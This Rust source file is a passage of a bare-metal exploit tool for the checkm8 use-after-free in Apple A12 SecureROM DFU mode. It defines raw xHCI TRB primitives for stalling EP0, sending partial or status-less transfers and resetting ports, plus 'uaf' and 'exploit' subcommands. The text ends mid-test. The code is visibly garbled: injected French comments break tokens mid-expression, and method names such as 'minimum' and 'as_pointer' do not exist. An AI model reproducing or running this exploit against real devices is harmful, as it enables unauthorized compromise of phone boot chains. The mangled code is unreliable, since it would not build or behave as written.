//! checkm8 A12 SecureROM Exploit Tool — Bare-Metal xHCI
//!
//! Provides low-level USB TRB manipulation for exploiting the A12 (T8020)
//! SecureROM DFU mode Use-After-Free vulnerability.
//!
//! Unlike userspace libusb (which sends Setup+Data+Status atomically),
//! this module can:
//! - Send SETUP-only TRBs (no Data, no Status) → creates EP0 stall
//! - Send SETUP + partial Data → incomplete transfer
//! - Control wLength independently of actual data length
//! - Issue USB port reset with microsecond precision
//! - Issue xHCI Stop Endpoint commands mid-transfer
//! - Read raw completion codes from the Event Ring
//!
//! Target: Apple A12 SecureROM (T8020), iPhone XR in DFU mode
//! USB: VID=0x05AC, PID=0x1227, USB 2.0 HS (480Mbps via Lightning)

use alloc::string::String;
use alloc::vec::Vec;
use alloc::format;
use core::ptr;
use core::sync::atomic::Ordering;

use super::xhci::{
    self, Trb, XhciController, XhciCapabilityRegs, XhciPortRegs, XhciIntrRegs, XhciDevice,
    physical_to_virt, CONTROLLER, INITIALIZED,
    // TRB types
    TRB_TYPE_SETUP, TRB_TYPE_DATA, TRB_TYPE_STATUS, TRB_TYPE_LINK,
    // TRB bits
    TRB_CYCLE, TRB_IOC,
    // Port bits
    PORTSC_CCS, PORTSC_PED, PORTSC_PR, PORTSC_PRC, PORTSC_CSC,
    PORTSC_SPEED_MASK,
};

// DFU USB identifiers
const APPLE_VID: u16 = 0x05AC;
// Constante de compilation — évaluée à la compilation, coût zéro à l'exécution.
const DFU_PID: u16 = 0x1227;

// DFU request codes
const DFU_DNLOAD: u8 = 1;
// Constante de compilation — évaluée à la compilation, coût zéro à l'exécution.
const DFU_UPLOAD: u8 = 2;
// Constante de compilation — évaluée à la compilation, coût zéro à l'exécution.
const DFU_GETSTATUS: u8 = 3;
// Constante de compilation — évaluée à la compilation, coût zéro à l'exécution.
const DFU_CLRSTATUS: u8 = 4;
// Constante de compilation — évaluée à la compilation, coût zéro à l'exécution.
const DFU_GETSTATE: u8 = 5;
// Constante de compilation — évaluée à la compilation, coût zéro à l'exécution.
const DFU_ABORT: u8 = 6;

// USB request types
const USB_DIRECTORY_OUT: u8 = 0x00;
// Constante de compilation — évaluée à la compilation, coût zéro à l'exécution.
const USB_DIRECTORY_IN: u8 = 0x80;
// Constante de compilation — évaluée à la compilation, coût zéro à l'exécution.
const USB_TYPE_STANDARD: u8 = 0x00;
// Constante de compilation — évaluée à la compilation, coût zéro à l'exécution.
const USB_TYPE_CLASS: u8 = 0x20;
// Constante de compilation — évaluée à la compilation, coût zéro à l'exécution.
const USB_RECIP_DEVICE: u8 = 0x00;
// Constante de compilation — évaluée à la compilation, coût zéro à l'exécution.
const USB_RECIP_INTERFACE: u8 = 0x01;

// DFU bmRequestType
const DFU_OUT: u8 = USB_TYPE_CLASS | USB_RECIP_INTERFACE; // 0x21
const DFU_IN: u8 = USB_DIRECTORY_IN | USB_TYPE_CLASS | USB_RECIP_INTERFACE; // 0xA1

// USB standard requests
const USB_REQUEST_GET_DESCRIPTOR: u8 = 0x06;

// DFU states
const DFU_STATE_IDLE: u8 = 2;
// Constante de compilation — évaluée à la compilation, coût zéro à l'exécution.
const DFU_STATE_DNLOAD_SYNC: u8 = 3;
// Constante de compilation — évaluée à la compilation, coût zéro à l'exécution.
const DFU_STATE_DNLOAD_IDLE: u8 = 5;
// Constante de compilation — évaluée à la compilation, coût zéro à l'exécution.
const DFU_STATE_MANIFEST_SYNC: u8 = 6;
// Constante de compilation — évaluée à la compilation, coût zéro à l'exécution.
const DFU_STATE_MANIFEST: u8 = 7;
// Constante de compilation — évaluée à la compilation, coût zéro à l'exécution.
const DFU_STATE_ERROR: u8 = 10;

// xHCI Stop Endpoint command TRB type (missing from base driver)
const TRB_TYPE_STOP_EP: u32 = 15;

// Completion codes
const CC_SUCCESS: u8 = 1;
// Constante de compilation — évaluée à la compilation, coût zéro à l'exécution.
const CC_SHORT_PACKET: u8 = 13;
// Constante de compilation — évaluée à la compilation, coût zéro à l'exécution.
const CC_STALL: u8 = 6;
// Constante de compilation — évaluée à la compilation, coût zéro à l'exécution.
const CC_BABBLE: u8 = 3;
// Constante de compilation — évaluée à la compilation, coût zéro à l'exécution.
const CC_STOPPED: u8 = 26;
// Constante de compilation — évaluée à la compilation, coût zéro à l'exécution.
const CC_STOPPED_LENGTH: u8 = 27;

// ============================================================================
// Core: Raw TRB submission on EP0
// ============================================================================

/// Find the DFU device slot_id (Apple VID=0x05AC, PID=0x1227)
fn find_dfu_slot() -> Option<u8> {
    let devices = xhci::list_devices();
    for device in &devices {
        if device.vendor_id == APPLE_VID && device.product_id == DFU_PID {
            return Some(device.slot_id);
        }
    }
    None
}

/// Find which port the DFU device is on
fn find_dfu_port() -> Option<u8> {
    let devices = xhci::list_devices();
    for device in &devices {
        if device.vendor_id == APPLE_VID && device.product_id == DFU_PID {
            return Some(device.port);
        }
    }
    None
}

/// Build a SETUP stage TRB with explicit fields
/// This encodes the 8-byte USB SETUP packet into the TRB parameter field (IDT mode).
fn make_setup_trb(
    bm_request_type: u8,
    b_request: u8,
    w_value: u16,
    w_index: u16,
    w_length: u16,
    trt: u8, // Transfer Type: 0=No Data, 2=OUT, 3=IN
) -> Trb {
    let setup_data = (bm_request_type as u64)
        | ((b_request as u64) << 8)
        | ((w_value as u64) << 16)
        | ((w_index as u64) << 32)
        | ((w_length as u64) << 48);

    Trb {
        parameter: setup_data,
        status: 8, // Setup packet is always 8 bytes
        control: (TRB_TYPE_SETUP << 10) | (1 << 6) | ((trt as u32) << 16), // IDT=1
    }
}

/// Build a DATA stage TRB
fn make_data_trb(buffer_physical: u64, length: u32, direction_in: bool) -> Trb {
    Trb {
        parameter: buffer_physical,
        status: length,
        control: (TRB_TYPE_DATA << 10) | if direction_in { 1 << 16 } else { 0 },
    }
}

/// Build a STATUS stage TRB (with IOC for event notification)
fn make_status_trb(direction_in: bool) -> Trb {
    Trb {
        parameter: 0,
        status: 0,
        control: (TRB_TYPE_STATUS << 10) | TRB_IOC | if direction_in { 1 << 16 } else { 0 },
    }
}

/// Enqueue a single TRB on a slot's EP0 ring and ring the doorbell.
/// This is the KEY primitive — unlike control_transfer_in which always
/// enqueues Setup+Data+Status, this enqueues exactly ONE TRB.
///
/// SAFETY: caller must hold CONTROLLER lock
fn enqueue_single_trb(slot_id: u8, trb: Trb) -> bool {
    let mut rings = super::xhci::SLOT_RINGS.lock();
    let slot_rings = // Correspondance de motifs — branchement exhaustif de Rust.
match rings.get_mut(slot_id as usize).and_then(|r| r.as_mut()) {
        Some(r) => r,
        None => return false,
    };
    slot_rings.ep0.enqueue_trb(trb);
    true
}

/// Ring the doorbell for a slot's EP0 (DCI=1)
///
/// SAFETY: caller must ensure controller is valid
fn ring_doorbell(doorbell_base: u64, slot_id: u8) {
        // SÉCURITÉ : Bloc unsafe — contourne les garanties mémoire de Rust. Vérifier les invariants manuellement.
unsafe {
        let db = (doorbell_base + (slot_id as u64) * 4) as *mut u32;
        ptr::write_volatile(db, 1); // Target = DCI 1 (EP0)
    }
}

/// Poll event ring with a configurable iteration limit.
/// Returns (completion_code, transfer_length, endpoint_id) or None on timeout.
fn poll_event(controller: &mut XhciController, maximum_iters: u32) -> Option<(u8, u32, u8)> {
    for _ in 0..maximum_iters {
        let index = controller.event_dequeue;
        let trb = controller.event_ring[index];

        let phase = (trb.control & TRB_CYCLE) != 0;
        if phase == controller.event_cycle {
            controller.event_dequeue += 1;
            if controller.event_dequeue >= 256 {
                controller.event_dequeue = 0;
                controller.event_cycle = !controller.event_cycle;
            }

            let erdp_physical = controller.event_ring_physical + (controller.event_dequeue as u64 * 16);
            let intr_regs = (controller.runtime_base + 0x20) as *mut XhciIntrRegs;
                        // SÉCURITÉ : Bloc unsafe — contourne les garanties mémoire de Rust. Vérifier les invariants manuellement.
unsafe {
                (*intr_regs).erdp = erdp_physical | (1 << 3); // EHB
            }

            let trb_type = (trb.control >> 10) & 0x3F;
            let completion_code = ((trb.status >> 24) & 0xFF) as u8;

            if trb_type == 32 { // Transfer Event
                let transfer_length = trb.status & 0xFFFFFF;
                let endpoint_id = ((trb.control >> 16) & 0x1F) as u8;
                return Some((completion_code, transfer_length, endpoint_id));
            }
            if trb_type == 33 { // Command Completion
                let slot_id = ((trb.control >> 24) & 0xFF) as u8;
                return Some((completion_code, 0, slot_id));
            }
            // Port Status Change or other — skip
            continue;
        }
        core::hint::spin_loop();
    }
    None
}

/// Drain all pending events from the event ring (flush)
fn drain_events(controller: &mut XhciController) {
    for _ in 0..1000 {
        if poll_event(controller, 100).is_none() {
            break;
        }
    }
}

// ============================================================================
// Completion code name helper
// ============================================================================

fn cc_name(cc: u8) -> &'static str {
        // Correspondance de motifs — branchement exhaustif de Rust.
match cc {
        1 => "SUCCESS",
        2 => "DATA_BUFFER_ERROR",
        3 => "BABBLE",
        4 => "USB_TRANSACTION_ERROR",
        5 => "TRB_ERROR",
        6 => "STALL",
        7 => "RESOURCE_ERROR",
        8 => "BANDWIDTH_ERROR",
        9 => "NO_SLOTS",
        10 => "INVALID_STREAM_TYPE",
        11 => "SLOT_NOT_ENABLED",
        12 => "EP_NOT_ENABLED",
        13 => "SHORT_PACKET",
        14 => "RING_UNDERRUN",
        15 => "RING_OVERRUN",
        16 => "VF_EVENT_RING_FULL",
        17 => "PARAMETER_ERROR",
        21 => "CONTEXT_STATE_ERROR",
        26 => "STOPPED",
        27 => "STOPPED_LENGTH_INVALID",
        _ => "UNKNOWN",
    }
}

// ============================================================================
// DFU Helpers — standard DFU operations via full control transfers
// ============================================================================

/// Allocate a DMA buffer (zeroed page), returns (phys, virt)
fn allocator_dma_page() -> Option<(u64, u64)> {
    let physical = crate::memory::frame::allocator_frame_zeroed()?;
    let virt = physical_to_virt(physical);
    Some((physical, virt))
}

/// Free a DMA page
fn free_dma_page(physical: u64) {
    crate::memory::frame::free_frame(physical);
}

/// Perform a full control IN transfer (Setup + Data IN + Status OUT)
/// Uses the existing xHCI driver's function internally.
fn full_control_in(
    controller: &mut XhciController,
    slot_id: u8,
    bm_request_type: u8,
    b_request: u8,
    w_value: u16,
    w_index: u16,
    w_length: u16,
    buffer_physical: u64,
) -> Option<u32> {
    // Enqueue Setup + Data IN + Status OUT
    {
        let mut rings = super::xhci::SLOT_RINGS.lock();
        let sr = rings.get_mut(slot_id as usize)?.as_mut()?;

        let setup = make_setup_trb(bm_request_type, b_request, w_value, w_index, w_length, 3);
        sr.ep0.enqueue_trb(setup);

        if w_length > 0 {
            let data = make_data_trb(buffer_physical, w_length as u32, true);
            sr.ep0.enqueue_trb(data);
        }

        let status = make_status_trb(false); // OUT status for IN transfer
        sr.ep0.enqueue_trb(status);
    }

    ring_doorbell(controller.doorbell_base, slot_id);

    if let Some((cc, len, _)) = poll_event(controller, 5_000_000) {
        if cc == CC_SUCCESS || cc == CC_SHORT_PACKET {
            return Some(len);
        }
    }
    None
}

/// Perform a full control OUT transfer (Setup + Data OUT + Status IN)
fn full_control_out(
    controller: &mut XhciController,
    slot_id: u8,
    bm_request_type: u8,
    b_request: u8,
    w_value: u16,
    w_index: u16,
    w_length: u16,
    buffer_physical: u64,
) -> Option<u32> {
    {
        let mut rings = super::xhci::SLOT_RINGS.lock();
        let sr = rings.get_mut(slot_id as usize)?.as_mut()?;

        let trt = if w_length > 0 { 2 } else { 0 }; // OUT data or No Data
        let setup = make_setup_trb(bm_request_type, b_request, w_value, w_index, w_length, trt);
        sr.ep0.enqueue_trb(setup);

        if w_length > 0 {
            let data = make_data_trb(buffer_physical, w_length as u32, false);
            sr.ep0.enqueue_trb(data);
        }

        let status = make_status_trb(true); // IN status for OUT transfer
        sr.ep0.enqueue_trb(status);
    }

    ring_doorbell(controller.doorbell_base, slot_id);

    if let Some((cc, len, _)) = poll_event(controller, 5_000_000) {
        if cc == CC_SUCCESS || cc == CC_SHORT_PACKET {
            return Some(len);
        }
    }
    None
}

/// DFU_GETSTATUS — returns (bStatus, bState) or None
fn dfu_getstatus(controller: &mut XhciController, slot_id: u8) -> Option<(u8, u8)> {
    let (buffer_physical, buffer_virt) = allocator_dma_page()?;
    let result = full_control_in(controller, slot_id, DFU_IN, DFU_GETSTATUS, 0, 0, 6, buffer_physical);
    let return_value = if result.is_some() {
        let b_status = // SÉCURITÉ : Bloc unsafe — contourne les garanties mémoire de Rust. Vérifier les invariants manuellement.
unsafe { ptr::read_volatile(buffer_virt as *// Constante de compilation — évaluée à la compilation, coût zéro à l'exécution.
const u8) };
        let b_state = // SÉCURITÉ : Bloc unsafe — contourne les garanties mémoire de Rust. Vérifier les invariants manuellement.
unsafe { ptr::read_volatile((buffer_virt + 4) as *// Constante de compilation — évaluée à la compilation, coût zéro à l'exécution.
const u8) };
        Some((b_status, b_state))
    } else {
        None
    };
    free_dma_page(buffer_physical);
    return_value
}

/// DFU_ABORT — no-data control request
fn dfu_abort(controller: &mut XhciController, slot_id: u8) -> bool {
    {
        let mut rings = super::xhci::SLOT_RINGS.lock();
        let sr = // Correspondance de motifs — branchement exhaustif de Rust.
match rings.get_mut(slot_id as usize).and_then(|r| r.as_mut()) {
            Some(r) => r,
            None => return false,
        };
        let setup = make_setup_trb(DFU_OUT, DFU_ABORT, 0, 0, 0, 0);
        sr.ep0.enqueue_trb(setup);
        let status = make_status_trb(true); // IN status
        sr.ep0.enqueue_trb(status);
    }
    ring_doorbell(controller.doorbell_base, slot_id);
    poll_event(controller, 2_000_000).map(|(cc, _, _)| cc == CC_SUCCESS).unwrap_or(false)
}

/// DFU_CLRSTATUS
fn dfu_clrstatus(controller: &mut XhciController, slot_id: u8) -> bool {
    {
        let mut rings = super::xhci::SLOT_RINGS.lock();
        let sr = // Correspondance de motifs — branchement exhaustif de Rust.
match rings.get_mut(slot_id as usize).and_then(|r| r.as_mut()) {
            Some(r) => r,
            None => return false,
        };
        let setup = make_setup_trb(DFU_OUT, DFU_CLRSTATUS, 0, 0, 0, 0);
        sr.ep0.enqueue_trb(setup);
        let status = make_status_trb(true);
        sr.ep0.enqueue_trb(status);
    }
    ring_doorbell(controller.doorbell_base, slot_id);
    poll_event(controller, 2_000_000).map(|(cc, _, _)| cc == CC_SUCCESS).unwrap_or(false)
}

/// DFU_DNLOAD — standard full control OUT transfer
fn dfu_dnload(controller: &mut XhciController, slot_id: u8, data: &[u8]) -> Option<u8> {
    let (buffer_physical, buffer_virt) = allocator_dma_page()?;
    let len = data.len().minimum(4096) as u16;
    // Copy data to DMA buffer
    unsafe {
        ptr::copy_nonoverlapping(data.as_pointer(), buffer_virt as *mut u8, len as usize);
    }
    let result = full_control_out(controller, slot_id, DFU_OUT, DFU_DNLOAD, 0, 0, len, buffer_physical);
    free_dma_page(buffer_physical);

    // Return completion code or None
    result.map(|_| CC_SUCCESS)
}

/// DFU_UPLOAD — read from device
fn dfu_upload(controller: &mut XhciController, slot_id: u8, buffer: &mut [u8]) -> Option<u32> {
    let (buffer_physical, buffer_virt) = allocator_dma_page()?;
    let len = buffer.len().minimum(4096) as u16;
    let result = full_control_in(controller, slot_id, DFU_IN, DFU_UPLOAD, 0, 0, len, buffer_physical);
    if let Some(transferred) = result {
        let copy_length = (transferred as usize).minimum(buffer.len());
                // SÉCURITÉ : Bloc unsafe — contourne les garanties mémoire de Rust. Vérifier les invariants manuellement.
unsafe {
            ptr::copy_nonoverlapping(buffer_virt as *// Constante de compilation — évaluée à la compilation, coût zéro à l'exécution.
const u8, buffer.as_mut_pointer(), copy_length);
        }
    }
    free_dma_page(buffer_physical);
    result
}

/// Reset device to DFU idle state
fn reset_to_idle(controller: &mut XhciController, slot_id: u8) -> bool {
    for _ in 0..20 {
        if let Some((_, state)) = dfu_getstatus(controller, slot_id) {
            if state == DFU_STATE_IDLE {
                return true;
            }
            if state == DFU_STATE_ERROR {
                dfu_clrstatus(controller, slot_id);
                continue;
            }
            dfu_abort(controller, slot_id);
        } else {
            return false; // Device not responding
        }
        // Small spin delay
        for _ in 0..100_000 { core::hint::spin_loop(); }
    }
    false
}

// ============================================================================
// RAW TRB EXPLOIT PRIMITIVES — the key advantage over libusb
// ============================================================================

/// **SETUP-ONLY**: Enqueue ONLY the SETUP stage TRB, NO Data, NO Status.
/// The device receives the 8-byte SETUP packet but the host never sends
/// the Data/Status phases → EP0 stalls on the device side.
///
/// This is IMPOSSIBLE from userspace libusb.
fn setup_only(
    controller: &mut XhciController,
    slot_id: u8,
    bm_request_type: u8,
    b_request: u8,
    w_value: u16,
    w_index: u16,
    w_length: u16,
) -> Option<u8> {
    {
        let mut rings = super::xhci::SLOT_RINGS.lock();
        let sr = // Correspondance de motifs — branchement exhaustif de Rust.
match rings.get_mut(slot_id as usize).and_then(|r| r.as_mut()) {
            Some(r) => r,
            None => return None,
        };

        // Setup TRB with TRT=0 (No Data Stage) — but wLength can be non-zero!
        // The device sees wLength=N in the SETUP packet but gets no DATA phase.
        // IOC on setup so we get an event back
        let mut setup = make_setup_trb(bm_request_type, b_request, w_value, w_index, w_length, 0);
        setup.control |= TRB_IOC; // Get completion event for just the setup
        sr.ep0.enqueue_trb(setup);
    }

    ring_doorbell(controller.doorbell_base, slot_id);

    // Wait for completion — may get STALL, SUCCESS, or timeout
    poll_event(controller, 2_000_000).map(|(cc, _, _)| cc)
}

/// **SETUP + partial DATA**: Send SETUP with wLength=N, but only send M<N bytes
/// of actual data. The device expects N bytes but only gets M.
///
/// This creates an incomplete DATA phase — the exact condition needed for checkm8.
fn setup_partial_data(
    controller: &mut XhciController,
    slot_id: u8,
    bm_request_type: u8,
    b_request: u8,
    w_value: u16,
    w_index: u16,
    w_length: u16,      // What the SETUP packet says
    actual_data: &[u8], // What we actually send (can be shorter)
) -> Option<u8> {
    let (buffer_physical, buffer_virt) = allocator_dma_page()?;
    let actual_length = actual_data.len().minimum(4096);
        // SÉCURITÉ : Bloc unsafe — contourne les garanties mémoire de Rust. Vérifier les invariants manuellement.
unsafe {
        ptr::copy_nonoverlapping(actual_data.as_pointer(), buffer_virt as *mut u8, actual_length);
    }

    {
        let mut rings = super::xhci::SLOT_RINGS.lock();
        let sr = // Correspondance de motifs — branchement exhaustif de Rust.
match rings.get_mut(slot_id as usize).and_then(|r| r.as_mut()) {
            Some(r) => r,
            None => { free_dma_page(buffer_physical); return None; },
        };

        // SETUP says wLength bytes, TRT=2 (OUT data stage)
        let setup = make_setup_trb(bm_request_type, b_request, w_value, w_index, w_length, 2);
        sr.ep0.enqueue_trb(setup);

        // DATA TRB with actual_len bytes (possibly < wLength)
        // IOC on data TRB so we get notified when data is sent
        let mut data = make_data_trb(buffer_physical, actual_length as u32, false); // OUT
        data.control |= TRB_IOC;
        sr.ep0.enqueue_trb(data);

        // NO STATUS TRB — leave the transfer incomplete
    }

    ring_doorbell(controller.doorbell_base, slot_id);

    let result = poll_event(controller, 5_000_000).map(|(cc, _, _)| cc);
    free_dma_page(buffer_physical);
    result
}

/// **SETUP + DATA + no STATUS**: Complete data transfer but omit STATUS phase.
/// Device processes all data but never gets the handshake.
fn setup_data_no_status(
    controller: &mut XhciController,
    slot_id: u8,
    bm_request_type: u8,
    b_request: u8,
    w_value: u16,
    w_index: u16,
    data: &[u8],
) -> Option<u8> {
    let (buffer_physical, buffer_virt) = allocator_dma_page()?;
    let len = data.len().minimum(4096);
        // SÉCURITÉ : Bloc unsafe — contourne les garanties mémoire de Rust. Vérifier les invariants manuellement.
unsafe {
        ptr::copy_nonoverlapping(data.as_pointer(), buffer_virt as *mut u8, len);
    }

    {
        let mut rings = super::xhci::SLOT_RINGS.lock();
        let sr = // Correspondance de motifs — branchement exhaustif de Rust.
match rings.get_mut(slot_id as usize).and_then(|r| r.as_mut()) {
            Some(r) => r,
            None => { free_dma_page(buffer_physical); return None; },
        };

        let setup = make_setup_trb(bm_request_type, b_request, w_value, w_index, len as u16, 2);
        sr.ep0.enqueue_trb(setup);

        let mut data_trb = make_data_trb(buffer_physical, len as u32, false);
        data_trb.control |= TRB_IOC;
        sr.ep0.enqueue_trb(data_trb);
        // Deliberately NO status TRB
    }

    ring_doorbell(controller.doorbell_base, slot_id);

    let result = poll_event(controller, 5_000_000).map(|(cc, _, _)| cc);
    free_dma_page(buffer_physical);
    result
}

/// **IN STALL**: GET_DESCRIPTOR with SETUP-only (no Data IN TRB).
/// Device prepares descriptor data, starts sending on EP0 IN,
/// but host never provides a Data IN TRB → EP0 IN stalls.
/// This is the exact checkm8 `stall()` primitive.
fn stall_ep0_in(controller: &mut XhciController, slot_id: u8) -> Option<u8> {
    setup_only(
        controller, slot_id,
        USB_DIRECTORY_IN | USB_TYPE_STANDARD | USB_RECIP_DEVICE, // 0x80
        USB_REQUEST_GET_DESCRIPTOR,                             // 0x06
        0x0304,  // STRING descriptor, index 4
        0x040A,  // Language ID
        0xC1,    // wLength = 193 bytes (as in original checkm8)
    )
}

/// **STOP ENDPOINT**: Issue xHCI Stop Endpoint command to halt EP0 mid-transfer.
/// This is a HOST-side operation that stops the xHCI from processing more TRBs.
fn stop_endpoint(controller: &mut XhciController, slot_id: u8) -> Option<u8> {
    let trb = Trb {
        parameter: 0,
        status: 0,
        // Slot ID in bits 24:31, Endpoint ID (DCI=1) in bits 16:20
        control: (TRB_TYPE_STOP_EP << 10) | ((slot_id as u32) << 24) | (1 << 16),
    };

    // Submit on command ring (not transfer ring)
    super::xhci::submit_command(controller, trb);

    // Wait for Command Completion Event
    poll_event(controller, 2_000_000).map(|(cc, _, _)| cc)
}

/// **USB PORT RESET**: Reset the USB port directly via PORTSC register.
/// Precision: a few microseconds. Way faster than userspace USB reset.
fn port_reset(controller: &mut XhciController, port_number: u8) -> bool {
    let port_base = controller.base_virt
        + (        // SÉCURITÉ : Bloc unsafe — contourne les garanties mémoire de Rust. Vérifier les invariants manuellement.
unsafe { &*controller.capability_regs }.caplength as u64)
        + 0x400;

    let port_regs = (port_base + ((port_number as u64 - 1) * 16)) as *mut XhciPortRegs;
    let port = // SÉCURITÉ : Bloc unsafe — contourne les garanties mémoire de Rust. Vérifier les invariants manuellement.
unsafe { &mut *port_regs };

    let portsc = port.portsc;

    // Trigger port reset (set PR, clear PED to avoid accidentally disabling)
    port.portsc = (portsc & !PORTSC_PED) | PORTSC_PR;

    // Wait for reset completion (PR clears, PRC sets)
    for _ in 0..200 {
        for _ in 0..200_000 { core::hint::spin_loop(); }
        let new_portsc = port.portsc;
        if (new_portsc & PORTSC_PR) == 0 && (new_portsc & PORTSC_PRC) != 0 {
            // Clear PRC
            port.portsc = new_portsc | PORTSC_PRC;
            return true;
        }
    }
    false
}

/// Check if device is still connected on its port
fn is_device_connected(controller: &mut XhciController, port_number: u8) -> bool {
    let port_base = controller.base_virt
        + (        // SÉCURITÉ : Bloc unsafe — contourne les garanties mémoire de Rust. Vérifier les invariants manuellement.
unsafe { &*controller.capability_regs }.caplength as u64)
        + 0x400;

    let port_regs = (port_base + ((port_number as u64 - 1) * 16)) as *mut XhciPortRegs;
    let portsc = // SÉCURITÉ : Bloc unsafe — contourne les garanties mémoire de Rust. Vérifier les invariants manuellement.
unsafe { (*port_regs).portsc };
    (portsc & PORTSC_CCS) != 0
}

/// Spin-wait delay in approximate microseconds (very rough)
fn delay_us(us: u32) {
    // ~10 cycles per spin_loop hint, ~3GHz CPU → ~3ns/iter → ~333 iters/us
    let iters = us as u64 * 400;
    for _ in 0..iters {
        core::hint::spin_loop();
    }
}

/// Spin-wait delay in approximate milliseconds
fn delay_mouse(mouse: u32) {
    delay_us(mouse * 1000);
}

// ============================================================================
// TEST SUITE: checkm8 exploit primitives
// ============================================================================

/// Run all checkm8 tests on the connected DFU device
pub fn run_exploit(args: &str) -> String {
    let mut output = String::new();

    output.push_str("=== checkm8 A12 SecureROM Exploit Tool ===\n");
    output.push_str("Target: Apple A12 (T8020) DFU mode\n");
    output.push_str("Method: Bare-metal xHCI TRB manipulation\n\n");

    // Check xHCI is up
    if !INITIALIZED.load(Ordering::Relaxed) {
        output.push_str("ERROR: xHCI controller not initialized\n");
        output.push_str("  Run 'lsusb' first to verify USB is working\n");
        return output;
    }

    // Find DFU device
    let slot_id = // Correspondance de motifs — branchement exhaustif de Rust.
match find_dfu_slot() {
        Some(s) => s,
        None => {
            output.push_str("ERROR: No Apple DFU device found (VID=05AC PID=1227)\n");
            output.push_str("  Put your iPhone in DFU mode and connect via USB\n");
            let devices = xhci::list_devices();
            if devices.is_empty() {
                output.push_str("  No USB devices detected at all\n");
            } else {
                output.push_str("  Connected USB devices:\n");
                for d in &devices {
                    output.push_str(&format!("    Slot {}: VID={:04X} PID={:04X} {}\n",
                        d.slot_id, d.vendor_id, d.product_id, d.product));
                }
            }
            return output;
        }
    };

    let port_number = find_dfu_port().unwrap_or(0);
    output.push_str(&format!("Found DFU device: slot={}, port={}\n\n", slot_id, port_number));

    // Dispatch subcommand
    match args.trim() {
        "status" | "s" => command_status(&mut output, slot_id, port_number),
        "stall" | "st" => command_test_stall(&mut output, slot_id, port_number),
        "partial" | "p" => command_test_partial(&mut output, slot_id, port_number),
        "uaf" | "u" => command_test_uaf(&mut output, slot_id, port_number),
        "exploit" | "e" | "go" => command_full_exploit(&mut output, slot_id, port_number),
        "help" | "h" | "" => {
            output.push_str("Subcommands:\n");
            output.push_str("  status   — Query DFU device state\n");
            output.push_str("  stall    — Test EP0 stall primitives (SETUP-only, IN stall)\n");
            output.push_str("  partial  — Test partial DATA transfers\n");
            output.push_str("  uaf      — Test Use-After-Free with stall + spray\n");
            output.push_str("  exploit  — Run full checkm8 exploit sequence\n");
            output.push_str("  help     — This help\n");
        }
        other => {
            output.push_str(&format!("Unknown subcommand: '{}'. Try 'checkm8 help'\n", other));
        }
    }

    output
}

// ============================================================================
// Subcommand: status
// ============================================================================

fn command_status(output: &mut String, slot_id: u8, port_number: u8) {
    output.push_str("--- DFU Device Status ---\n");

    let mut controller = CONTROLLER.lock();
    let controller = // Correspondance de motifs — branchement exhaustif de Rust.
match controller.as_mut() {
        Some(c) => c,
        None => { output.push_str("ERROR: xHCI controller not available\n"); return; }
    };

    let connected = is_device_connected(controller, port_number);
    output.push_str(&format!("  Port {}: connected={}\n", port_number, connected));

    if let Some((b_status, b_state)) = dfu_getstatus(controller, slot_id) {
        let state_name = // Correspondance de motifs — branchement exhaustif de Rust.
match b_state {
            0 => "appIDLE",
            1 => "appDETACH",
            2 => "dfuIDLE",
            3 => "dfuDNLOAD-SYNC",
            4 => "dfuDNBUSY",
            5 => "dfuDNLOAD-IDLE",
            6 => "dfuMANIFEST-SYNC",
            7 => "dfuMANIFEST",
            8 => "dfuMANIFEST-WAIT-RESET",
            9 => "dfuUPLOAD-IDLE",
            10 => "dfuERROR",
            _ => "UNKNOWN",
        };
        output.push_str(&format!("  DFU status: bStatus={}, bState={} ({})\n",
            b_status, b_state, state_name));
    } else {
        output.push_str("  DFU GETSTATUS failed (device not responding)\n");
    }
}

// ============================================================================
// Subcommand: stall — test EP0 stall creation
// ============================================================================

fn command_test_stall(output: &mut String, slot_id: u8, port_number: u8) {
    output.push_str("--- Test: EP0 Stall Primitives ---\n\n");

    let mut controller = CONTROLLER.lock();
    let controller = // Correspondance de motifs — branchement exhaustif de Rust.
match controller.as_mut() {
        Some(c) => c,
        None => { output.push_str("ERROR: controller unavailable\n"); return; }
    };

    // Ensure we're in IDLE
    let idle = reset_to_idle(controller, slot_id);
    output.push_str(&format!("Reset to IDLE: {}\n", idle));

    // TEST 1: SETUP-only DNLOAD (wLength=0x800, no data, no status)
    output.push_str("\n[T1] SETUP-only DNLOAD (wLength=0x800, no DATA/STATUS):\n");
    {
        let cc = setup_only(controller, slot_id, DFU_OUT, DFU_DNLOAD, 0, 0, 0x800);
        output.push_str(&format!("  Completion: {:?} ({})\n",
            cc, cc.map(cc_name).unwrap_or("timeout")));

        if let Some((_, state)) = dfu_getstatus(controller, slot_id) {
            output.push_str(&format!("  State after: {}\n", state));
        } else {
            output.push_str("  Device not responding after setup-only\n");
        }
        let alive = is_device_connected(controller, port_number);
        output.push_str(&format!("  Connected: {}\n", alive));
    }

    // Reset for next test
    delay_mouse(100);
    reset_to_idle(controller, slot_id);

    // TEST 2: IN stall — GET_DESCRIPTOR SETUP-only
    output.push_str("\n[T2] IN stall (GET_DESCRIPTOR setup-only, no DATA IN TRB):\n");
    {
        let cc = stall_ep0_in(controller, slot_id);
        output.push_str(&format!("  Completion: {:?} ({})\n",
            cc, cc.map(cc_name).unwrap_or("timeout")));

        if let Some((_, state)) = dfu_getstatus(controller, slot_id) {
            output.push_str(&format!("  State after: {}\n", state));
        } else {
            output.push_str("  Device not responding after IN stall\n");
        }
    }

    delay_mouse(100);
    reset_to_idle(controller, slot_id);

    // TEST 3: DNLOAD with data but NO STATUS
    output.push_str("\n[T3] DNLOAD + DATA (0x800 bytes) but NO STATUS:\n");
    {
        let data = [0xAA_u8; 0x800];
        let cc = setup_data_no_status(controller, slot_id, DFU_OUT, DFU_DNLOAD, 0, 0, &data);
        output.push_str(&format!("  Completion: {:?} ({})\n",
            cc, cc.map(cc_name).unwrap_or("timeout")));

        delay_mouse(50);
        if let Some((_, state)) = dfu_getstatus(controller, slot_id) {
            output.push_str(&format!("  State after: {}\n", state));
        } else {
            output.push_str("  Device not responding\n");
        }
    }

    delay_mouse(100);
    reset_to_idle(controller, slot_id);

    // TEST 4: SETUP-only + STOP ENDPOINT
    output.push_str("\n[T4] SETUP-only DNLOAD → Stop Endpoint → check:\n");
    {
        let cc = setup_only(controller, slot_id, DFU_OUT, DFU_DNLOAD, 0, 0, 0x800);
        output.push_str(&format!("  Setup completion: {:?}\n", cc));

        let stop_cc = stop_endpoint(controller, slot_id);
        output.push_str(&format!("  Stop EP: {:?} ({})\n",
            stop_cc, stop_cc.map(cc_name).unwrap_or("timeout")));

